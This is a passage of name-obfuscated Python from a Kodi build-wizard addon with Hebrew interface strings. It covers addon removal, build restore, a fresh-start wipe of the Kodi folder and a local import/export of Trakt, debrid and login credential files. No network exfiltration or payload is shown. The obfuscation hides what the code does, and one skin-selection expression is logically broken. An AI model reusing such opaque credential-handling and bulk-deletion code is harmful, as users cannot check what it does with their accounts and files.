	del OOOO0OOO0OOOOO000 #line:4587
def removeAddon (OOO0OO0000O00OO0O ,O00O0000OOO0O0O00 ,over =False ):#line:4589
	if not over ==False :#line:4590
		O0OOO000000OOOO00 =1 #line:4591
	else :#line:4592
		O0OOO000000OOOO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O0000OOO0O0O00 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OOO0OO0000O00OO0O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4593
	if O0OOO000000OOOO00 ==1 :#line:4594
		OO0O0OO0O00OOOOOO =os .path .join (ADDONS ,OOO0OO0000O00OO0O )#line:4595
		wiz .log ("Removing Addon %s"%OOO0OO0000O00OO0O )#line:4596
		wiz .cleanHouse (OO0O0OO0O00OOOOOO )#line:4597
		xbmc .sleep (1000 )#line:4598
		try :shutil .rmtree (OO0O0OO0O00OOOOOO )#line:4599
		except Exception as O0000OO0O00O0OO0O :wiz .log ("Error removing %s"%OOO0OO0000O00OO0O ,xbmc .LOGNOTICE )#line:4600
		removeAddonData (OOO0OO0000O00OO0O ,O00O0000OOO0O0O00 ,over )#line:4601
	if over ==False :#line:4602
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O00O0000OOO0O0O00 ))#line:4603
def removeAddonData (OOOO000OO0OOO0O0O ,name =None ,over =False ):#line:4605
	if OOOO000OO0OOO0O0O =='all':#line:4606
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4607
			wiz .cleanHouse (ADDOND )#line:4608
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4609
	elif OOOO000OO0OOO0O0O =='uninstalled':#line:4610
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4611
			O0O000OO0OO0OO000 =0 #line:4612
			for OO0OO00OO0O0OOO0O in glob .glob (os .path .join (ADDOND ,'*')):#line:4613
				OOOO00O0000000O0O =OO0OO00OO0O0OOO0O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4614
				if OOOO00O0000000O0O in EXCLUDES :pass #line:4615
				elif os .path .exists (os .path .join (ADDONS ,OOOO00O0000000O0O )):pass #line:4616
				else :wiz .cleanHouse (OO0OO00OO0O0OOO0O );O0O000OO0OO0OO000 +=1 ;wiz .log (OO0OO00OO0O0OOO0O );shutil .rmtree (OO0OO00OO0O0OOO0O )#line:4617
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O000OO0OO0OO000 ))#line:4618
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4619
	elif OOOO000OO0OOO0O0O =='empty':#line:4620
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4621
			O0O000OO0OO0OO000 =wiz .emptyfolder (ADDOND )#line:4622
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0O000OO0OO0OO000 ))#line:4623
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4624
	else :#line:4625
		OO00O00O000000OO0 =os .path .join (USERDATA ,'addon_data',OOOO000OO0OOO0O0O )#line:4626
		if OOOO000OO0OOO0O0O in EXCLUDES :#line:4627
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4628
		elif os .path .exists (OO00O00O000000OO0 ):#line:4629
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOO000OO0OOO0O0O ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4630
				wiz .cleanHouse (OO00O00O000000OO0 )#line:4631
				try :#line:4632
					shutil .rmtree (OO00O00O000000OO0 )#line:4633
				except :#line:4634
					wiz .log ("Error deleting: %s"%OO00O00O000000OO0 )#line:4635
			else :#line:4636
				wiz .log ('Addon data for %s was not removed'%OOOO000OO0OOO0O0O )#line:4637
	wiz .refresh ()#line:4638
def restoreit (OOO000O0O0000O0OO ):#line:4640
	if OOO000O0O0000O0OO =='build':#line:4641
		OOO0O0O0000OO0000 =freshStart ('restore')#line:4642
		if OOO0O0O0000OO0000 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4643
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4644
		wiz .skinToDefault ()#line:4645
	wiz .restoreLocal (OOO000O0O0000O0OO )#line:4646
def restoreextit (O000OO00OO0O0OO0O ):#line:4648
	if O000OO00OO0O0OO0O =='build':#line:4649
		OO00O0O0OOO00O0O0 =freshStart ('restore')#line:4650
		if OO00O0O0OOO00O0O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4651
	wiz .restoreExternal (O000OO00OO0O0OO0O )#line:4652
def buildInfo (OOOOO0OOO0OO0OOOO ):#line:4654
	if wiz .workingURL (SPEEDFILE )==True :#line:4655
		if wiz .checkBuild (OOOOO0OOO0OO0OOOO ,'url'):#line:4656
			OOOOO0OOO0OO0OOOO ,OOO00OO0000OO00O0 ,OOO00O00000O000O0 ,OO00OO000OO0OO00O ,O0OO00O0O0OO0OO00 ,O00OO0000OOOOO000 ,O0OO0O00OOO0OO00O ,OO00OOO0O0O0O0O0O ,O0O0O0000OOOOO0OO ,O0O0OOOO000000O00 ,OO0O00O00OOO0O000 =wiz .checkBuild (OOOOO0OOO0OO0OOOO ,'all')#line:4657
			O0O0OOOO000000O00 ='Yes'if O0O0OOOO000000O00 .lower ()=='yes'else 'No'#line:4658
			O00OO0OOO00OOO0O0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOO0OOO0OO0OOOO )#line:4659
			O00OO0OOO00OOO0O0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOO00OO0000OO00O0 )#line:4660
			if not O00OO0000OOOOO000 =="http://":#line:4661
				OO0O0OO0O0OO0O0OO =wiz .themeCount (OOOOO0OOO0OO0OOOO ,False )#line:4662
				O00OO0OOO00OOO0O0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OO0O0OO0O0OO0O0OO ))#line:4663
			O00OO0OOO00OOO0O0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO00O0O0OO0OO00 )#line:4664
			O00OO0OOO00OOO0O0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0OOOO000000O00 )#line:4665
			O00OO0OOO00OOO0O0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O00O00OOO0O000 )#line:4666
			wiz .TextBox (ADDONTITLE ,O00OO0OOO00OOO0O0 )#line:4667
		else :wiz .log ("Invalid Build Name!")#line:4668
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4669
def buildVideo (OO0OO0OOOOOOOO0O0 ):#line:4671
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4672
	if wiz .workingURL (SPEEDFILE )==True :#line:4673
		O00000000OO00OOO0 =wiz .checkBuild (OO0OO0OOOOOOOO0O0 ,'preview')#line:4674
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OO0OO0OOOOOOOO0O0 )#line:4675
		if O00000000OO00OOO0 and not O00000000OO00OOO0 =='http://':playVideo (O00000000OO00OOO0 )#line:4676
		else :wiz .log ("[%s]Unable to find url for video preview"%OO0OO0OOOOOOOO0O0 )#line:4677
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4678
def dependsList (OOOOOO00OO00OOOO0 ):#line:4680
	O0OO00000OOO0O0OO =os .path .join (ADDONS ,OOOOOO00OO00OOOO0 ,'addon.xml')#line:4681
	if os .path .exists (O0OO00000OOO0O0OO ):#line:4682
		O000O0000OO0O0O0O =open (O0OO00000OOO0O0OO ,mode ='r');O0O0000000O0O0O00 =O000O0000OO0O0O0O .read ();O000O0000OO0O0O0O .close ();#line:4683
		O000O00OOO00OO0OO =wiz .parseDOM (O0O0000000O0O0O00 ,'import',ret ='addon')#line:4684
		O00O0OOO0OO0OOO0O =[]#line:4685
		for O0O00OO000O00O00O in O000O00OOO00OO0OO :#line:4686
			if not 'xbmc.python'in O0O00OO000O00O00O :#line:4687
				O00O0OOO0OO0OOO0O .append (O0O00OO000O00O00O )#line:4688
		return O00O0OOO0OO0OOO0O #line:4689
	return []#line:4690
def manageSaveData (O00O0OOOOOO00O0O0 ):#line:4692
	if O00O0OOOOOO00O0O0 =='import':#line:4693
		OOO0O00OOO00O00O0 =os .path .join (ADDONDATA ,'temp')#line:4694
		if not os .path .exists (OOO0O00OOO00O00O0 ):os .makedirs (OOO0O00OOO00O00O0 )#line:4695
		OO00OOOOO0O00OOOO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4696
		if not OO00OOOOO0O00OOOO .endswith ('.zip'):#line:4697
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4698
			return #line:4699
		OO00OO0OO0O000000 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4700
		OO0O0OOOO00OOOOOO =xbmcvfs .copy (OO00OOOOO0O00OOOO ,OO00OO0OO0O000000 )#line:4701
		wiz .log ("%s"%str (OO0O0OOOO00OOOOOO ))#line:4702
		extract .all (xbmc .translatePath (OO00OO0OO0O000000 ),OOO0O00OOO00O00O0 )#line:4703
		OO0O0OO0O00OO000O =os .path .join (OOO0O00OOO00O00O0 ,'trakt')#line:4704
		O0OOO0O00OOOO00OO =os .path .join (OOO0O00OOO00O00O0 ,'login')#line:4705
		O0OO00000OOOO0O00 =os .path .join (OOO0O00OOO00O00O0 ,'debrid')#line:4706
		OO000O00OOO0O00O0 =0 #line:4707
		if os .path .exists (OO0O0OO0O00OO000O ):#line:4708
			OO000O00OOO0O00O0 +=1 #line:4709
			O00O0O0O0O0OOO0O0 =os .listdir (OO0O0OO0O00OO000O )#line:4710
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4711
			for OOOO0OO000O0O000O in O00O0O0O0O0OOO0O0 :#line:4712
				O00O000O0O0000O0O =os .path .join (traktit .TRAKTFOLD ,OOOO0OO000O0O000O )#line:4713
				OO0OOO0OOOO00O0OO =os .path .join (OO0O0OO0O00OO000O ,OOOO0OO000O0O000O )#line:4714
				if os .path .exists (O00O000O0O0000O0O ):#line:4715
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOO0OO000O0O000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4716
					else :os .remove (O00O000O0O0000O0O )#line:4717
				shutil .copy (OO0OOO0OOOO00O0OO ,O00O000O0O0000O0O )#line:4718
			traktit .importlist ('all')#line:4719
			traktit .traktIt ('restore','all')#line:4720
		if os .path .exists (O0OOO0O00OOOO00OO ):#line:4721
			OO000O00OOO0O00O0 +=1 #line:4722
			O00O0O0O0O0OOO0O0 =os .listdir (O0OOO0O00OOOO00OO )#line:4723
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4724
			for OOOO0OO000O0O000O in O00O0O0O0O0OOO0O0 :#line:4725
				O00O000O0O0000O0O =os .path .join (loginit .LOGINFOLD ,OOOO0OO000O0O000O )#line:4726
				OO0OOO0OOOO00O0OO =os .path .join (O0OOO0O00OOOO00OO ,OOOO0OO000O0O000O )#line:4727
				if os .path .exists (O00O000O0O0000O0O ):#line:4728
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOO0OO000O0O000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4729
					else :os .remove (O00O000O0O0000O0O )#line:4730
				shutil .copy (OO0OOO0OOOO00O0OO ,O00O000O0O0000O0O )#line:4731
			loginit .importlist ('all')#line:4732
			loginit .loginIt ('restore','all')#line:4733
		if os .path .exists (O0OO00000OOOO0O00 ):#line:4734
			OO000O00OOO0O00O0 +=1 #line:4735
			O00O0O0O0O0OOO0O0 =os .listdir (O0OO00000OOOO0O00 )#line:4736
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4737
			for OOOO0OO000O0O000O in O00O0O0O0O0OOO0O0 :#line:4738
				O00O000O0O0000O0O =os .path .join (debridit .REALFOLD ,OOOO0OO000O0O000O )#line:4739
				OO0OOO0OOOO00O0OO =os .path .join (O0OO00000OOOO0O00 ,OOOO0OO000O0O000O )#line:4740
				if os .path .exists (O00O000O0O0000O0O ):#line:4741
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OOOO0OO000O0O000O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4742
					else :os .remove (O00O000O0O0000O0O )#line:4743
				shutil .copy (OO0OOO0OOOO00O0OO ,O00O000O0O0000O0O )#line:4744
			debridit .importlist ('all')#line:4745
			debridit .debridIt ('restore','all')#line:4746
		wiz .cleanHouse (OOO0O00OOO00O00O0 )#line:4747
		wiz .removeFolder (OOO0O00OOO00O00O0 )#line:4748
		os .remove (OO00OO0OO0O000000 )#line:4749
		if OO000O00OOO0O00O0 ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4750
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4751
	elif O00O0OOOOOO00O0O0 =='export':#line:4752
		OOO0OOOOOO0OO0000 =xbmc .translatePath (MYBUILDS )#line:4753
		OOOO0000O0OOO000O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4754
		traktit .traktIt ('update','all')#line:4755
		loginit .loginIt ('update','all')#line:4756
		debridit .debridIt ('update','all')#line:4757
		OO00OOOOO0O00OOOO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4758
		OO00OOOOO0O00OOOO =xbmc .translatePath (OO00OOOOO0O00OOOO )#line:4759
		O000000O0000OO000 =os .path .join (OOO0OOOOOO0OO0000 ,'SaveData.zip')#line:4760
		OOOOOO0OO0O00OO00 =zipfile .ZipFile (O000000O0000OO000 ,mode ='w')#line:4761
		for O000O0OO00OO0000O in OOOO0000O0OOO000O :#line:4762
			if os .path .exists (O000O0OO00OO0000O ):#line:4763
				O00O0O0O0O0OOO0O0 =os .listdir (O000O0OO00OO0000O )#line:4764
				for O00OO0OOO0O0O0O0O in O00O0O0O0O0OOO0O0 :#line:4765
					OOOOOO0OO0O00OO00 .write (os .path .join (O000O0OO00OO0000O ,O00OO0OOO0O0O0O0O ),os .path .join (O000O0OO00OO0000O ,O00OO0OOO0O0O0O0O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4766
		OOOOOO0OO0O00OO00 .close ()#line:4767
		if OO00OOOOO0O00OOOO ==OOO0OOOOOO0OO0000 :#line:4768
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000O0000OO000 ))#line:4769
		else :#line:4770
			try :#line:4771
				xbmcvfs .copy (O000000O0000OO000 ,os .path .join (OO00OOOOO0O00OOOO ,'SaveData.zip'))#line:4772
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OO00OOOOO0O00OOOO ,'SaveData.zip')))#line:4773
			except :#line:4774
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000000O0000OO000 ))#line:4775
def freshStart (install =None ,over =False ):#line:4780
	if USERNAME =='':#line:4781
		ADDON .openSettings ()#line:4782
		sys .exit ()#line:4783
	O0OO000O00O0OO0O0 =u_list (SPEEDFILE )#line:4784
	(O0OO000O00O0OO0O0 )#line:4785
	O0OO0OO00O0000O0O =(wiz .workingURL (O0OO000O00O0OO0O0 ))#line:4786
	(O0OO0OO00O0000O0O )#line:4787
	if KEEPTRAKT =='true':#line:4788
		traktit .autoUpdate ('all')#line:4789
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4790
	if KEEPREAL =='true':#line:4791
		debridit .autoUpdate ('all')#line:4792
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4793
	if KEEPLOGIN =='true':#line:4794
		loginit .autoUpdate ('all')#line:4795
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4796
	if over ==True :OO00O00OOOO0000OO =1 #line:4797
	elif install =='restore':OO00O00OOOO0000OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4798
	elif install :OO00O00OOOO0000OO =1 #line:4799
	else :OO00O00OOOO0000OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4800
	if OO00O00OOOO0000OO :#line:4801
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4802
			O0O0O0OOO00OOOO00 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4803
			skinSwitch .swapSkins (O0O0O0OOO00OOOO00 )#line:4806
			OOOOO00OOO0OOOO00 =0 #line:4807
			xbmc .sleep (1000 )#line:4808
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOOO00OOO0OOOO00 <150 :#line:4809
				OOOOO00OOO0OOOO00 +=1 #line:4810
				xbmc .sleep (1000 )#line:4811
				wiz .ebi ('SendAction(Select)')#line:4812
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4813
				wiz .ebi ('SendClick(11)')#line:4814
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4815
			xbmc .sleep (1000 )#line:4816
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4817
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4818
			return #line:4819
		wiz .addonUpdates ('set')#line:4820
		O000OOO0OOO0OOOOO =os .path .abspath (HOME )#line:4821
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4822
		O000O000OO000000O =sum ([len (O0000OOO0O0000O0O )for O0OO00000OOOO00O0 ,OOOO00OO00OOOO0OO ,O0000OOO0O0000O0O in os .walk (O000OOO0OOO0OOOOO )]);OOOOOOO0O000OOO0O =0 #line:4823
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4824
		EXCLUDES .append ('My_Builds')#line:4825
		EXCLUDES .append ('archive_cache')#line:4826
		EXCLUDES .append ('script.module.requests')#line:4827
		EXCLUDES .append ('myfav.anon')#line:4828
		if KEEPREPOS =='true':#line:4829
			O0OO0OOO0O0OO0OOO =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4830
			for OOOO0O0O000OO00O0 in O0OO0OOO0O0OO0OOO :#line:4831
				O0O0OO000O0OOO000 =os .path .split (OOOO0O0O000OO00O0 [:-1 ])[1 ]#line:4832
				if not O0O0OO000O0OOO000 ==EXCLUDES :#line:4833
					EXCLUDES .append (O0O0OO000O0OOO000 )#line:4834
		if KEEPSUPER =='true':#line:4835
			EXCLUDES .append ('plugin.program.super.favourites')#line:4836
		if KEEPMOVIELIST =='true':#line:4837
			EXCLUDES .append ('plugin.video.metalliq')#line:4838
		if KEEPMOVIELIST =='true':#line:4839
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4840
		if KEEPADDONS =='true':#line:4841
			EXCLUDES .append ('addons')#line:4842
		if KEEPADDONS =='true':#line:4843
			EXCLUDES .append ('addon_data')#line:4844
		EXCLUDES .append ('plugin.video.elementum')#line:4847
		EXCLUDES .append ('script.elementum.burst')#line:4848
		EXCLUDES .append ('script.elementum.burst-master')#line:4849
		EXCLUDES .append ('plugin.video.quasar')#line:4850
		EXCLUDES .append ('script.quasar.burst')#line:4851
		EXCLUDES .append ('skin.estuary')#line:4852
		if KEEPWHITELIST =='true':#line:4855
			OO0O0OOOO0O00O000 =''#line:4856
			OO000OO0O000O0O00 =wiz .whiteList ('read')#line:4857
			if len (OO000OO0O000O0O00 )>0 :#line:4858
				for OOOO0O0O000OO00O0 in OO000OO0O000O0O00 :#line:4859
					try :OOOOOO00OOOOOOOO0 ,OO000OOOOO0000O0O ,O0O0O00OO0OO00OO0 =OOOO0O0O000OO00O0 #line:4860
					except :pass #line:4861
					if O0O0O00OO0OO00OO0 .startswith ('pvr'):OO0O0OOOO0O00O000 =OO000OOOOO0000O0O #line:4862
					O0OO000O0O0000OOO =dependsList (O0O0O00OO0OO00OO0 )#line:4863
					for O0OOOOO0O0O0000O0 in O0OO000O0O0000OOO :#line:4864
						if not O0OOOOO0O0O0000O0 in EXCLUDES :#line:4865
							EXCLUDES .append (O0OOOOO0O0O0000O0 )#line:4866
						O0OO0O000OOO00O00 =dependsList (O0OOOOO0O0O0000O0 )#line:4867
						for OOO0OOO0O0O000OOO in O0OO0O000OOO00O00 :#line:4868
							if not OOO0OOO0O0O000OOO in EXCLUDES :#line:4869
								EXCLUDES .append (OOO0OOO0O0O000OOO )#line:4870
					if not O0O0O00OO0OO00OO0 in EXCLUDES :#line:4871
						EXCLUDES .append (O0O0O00OO0OO00OO0 )#line:4872
				if not OO0O0OOOO0O00O000 =='':wiz .setS ('pvrclient',O0O0O00OO0OO00OO0 )#line:4873
		if wiz .getS ('pvrclient')=='':#line:4874
			for OOOO0O0O000OO00O0 in EXCLUDES :#line:4875
				if OOOO0O0O000OO00O0 .startswith ('pvr'):#line:4876
					wiz .setS ('pvrclient',OOOO0O0O000OO00O0 )#line:4877
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4878
		OOO00OOOO0000OOO0 =wiz .latestDB ('Addons')#line:4879
		for O0O00O0OO0OO0O0O0 ,OOO00O00OO00OOO0O ,O00000OOOO0O00O0O in os .walk (O000OOO0OOO0OOOOO ,topdown =True ):#line:4880
			OOO00O00OO00OOO0O [:]=[OO0O0OO00OO0OO0OO for OO0O0OO00OO0OO0OO in OOO00O00OO00OOO0O if OO0O0OO00OO0OO0OO not in EXCLUDES ]#line:4881
			for OOOOOO00OOOOOOOO0 in O00000OOOO0O00O0O :#line:4882
				OOOOOOO0O000OOO0O +=1 #line:4883
				O0O0O00OO0OO00OO0 =O0O00O0OO0OO0O0O0 .replace ('/','\\').split ('\\')#line:4884
				OOOOO00OOO0OOOO00 =len (O0O0O00OO0OO00OO0 )-1 #line:4886
				if O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -2 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4887
				elif OOOOOO00OOOOOOOO0 =='MyVideos99.db'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4888
				elif OOOOOO00OOOOOOOO0 =='MyVideos107.db'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4889
				elif OOOOOO00OOOOOOOO0 =='MyVideos116.db'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4890
				elif OOOOOO00OOOOOOOO0 =='MyVideos99.db'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4891
				elif OOOOOO00OOOOOOOO0 =='MyVideos107.db'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -1 ]=='userdata'and O0O0O00OO0OO00OO0 [OOOOO00OOO0OOOO00 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00O0OO0OO0O0O0 ,OOOOOO00OOOOOOOO0 ),xbmc .LOGNOTICE )#line:4892
